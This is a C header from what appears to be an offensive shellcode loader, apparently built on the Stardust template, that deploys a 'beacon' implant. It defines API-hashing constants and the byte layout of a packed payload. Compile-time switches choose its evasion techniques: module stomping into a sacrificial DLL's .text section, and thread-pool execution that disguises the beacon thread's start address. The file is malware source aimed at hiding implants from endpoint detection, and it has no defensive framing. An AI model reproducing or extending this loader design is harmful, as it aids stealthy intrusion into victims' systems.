#ifndef STARDUST_DEFS_H
#define STARDUST_DEFS_H

#include <Common.h>

typedef struct _BUFFER {
    PVOID Buffer;
    ULONG Length;
} BUFFER, *PBUFFER;

//
// Hashing defines
//
#define H_MAGIC_KEY          0x811c9dc5
#define H_MAGIC_PRIME        0x01000193
#define H_MODULE_NTDLL       0x318a7963
#define H_MODULE_KERNEL32    0x04a1a06a
#define H_MODULE_KERNELBASE  0xe9914f7a

//
// NaxHeader v2 - placed between loader and beacon in nax.bin
//
// Layout:  [loader][NaxHeader][beacon][pdata][xdata]
//           ^                  ^       ^      ^
//      StRipStart()       +HDR_SZ  +beacon  +pdata
//
#define NAX_HDR_MAGIC     0x4E415832  /* "NAX2" */
#define NAX_HDR_SIZE      160         /* fixed header size (bytes) */
#define NAX_HDR_DLL_MAX   64          /* max WCHAR chars for DLL name */

#define NAX_FLAG_MODULE_STOMP  0x0001 /* use module stomping instead of VirtualAlloc */
#define NAX_FLAG_STOMP_PDATA   0x0002 /* stomp .pdata with unwind data */

//
// On-disk header (no struct due to PIC - accessed via pointer arithmetic).
//
// Offset  Size  Field
// 0       4     Magic           (0x4E415832)
// 4       4     BeaconSize      (bytes)
// 8       4     PdataSize       (bytes, 0 = none)
// 12      4     XdataSize       (bytes, 0 = none)
// 16      4     OrigTextRva     (.text RVA from beacon EXE)
// 20      4     Flags           (NAX_FLAG_*)
// 24      128   StompDll        (WCHAR[64], NUL-terminated, zero-padded)
// 152     8     Reserved
// --- total: 160 bytes ---
//
#define NAX_HDR_OFF_MAGIC       0
#define NAX_HDR_OFF_BEACON_SZ   4
#define NAX_HDR_OFF_PDATA_SZ    8
#define NAX_HDR_OFF_XDATA_SZ    12
#define NAX_HDR_OFF_TEXT_RVA    16
#define NAX_HDR_OFF_FLAGS       20
#define NAX_HDR_OFF_DLL_NAME   24
#define NAX_HDR_OFF_RESERVED   152

//
// Stomp context tag - written by loader at TextBase + BeaconSize
// so beacon can discover the clean .text backup at boot.
//
#define NAX_STOMP_CTX_MAGIC  0x4E415854  /* "NAXT" */

//
// Compile-time technique selection
//
// NAX_STOMP_MODE: which memory allocation strategy the loader uses
//   0 = VirtualAlloc (private memory, PAGE_EXECUTE_READ)
//   1 = Module stomp (image-backed, sacrificial DLL .text)
//
// NAX_EXEC_MODE: how the beacon thread is started
//   0 = CreateThread (clean stack, but start address = beacon entry)
//   1 = Thread pool  (start address = ntdll!TppWorkerThread)
//
#define NAX_STOMP_VIRTUAL    0
#define NAX_STOMP_MODULE     1

#define NAX_EXEC_THREAD      0
#define NAX_EXEC_THREADPOOL  1

#ifndef NAX_STOMP_MODE
#define NAX_STOMP_MODE  NAX_STOMP_MODULE
#endif

#ifndef NAX_EXEC_MODE
#define NAX_EXEC_MODE   NAX_EXEC_THREADPOOL
#endif


#endif //STARDUST_DEFS_H
